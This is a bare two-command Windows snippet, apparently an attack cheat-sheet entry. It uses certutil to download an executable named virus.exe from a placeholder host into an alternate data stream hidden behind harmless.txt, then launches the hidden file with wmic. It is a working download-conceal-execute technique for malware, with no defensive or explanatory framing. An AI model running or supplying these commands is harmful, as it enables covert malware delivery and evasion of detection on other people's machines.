#download and hide exe
certutil.exe -urlcache -split -f http://example.com/virus.exe harmless.txt:virus.exe

#execute hidden exe
wmic process call create "c:\harmless.txt:virus.exe"
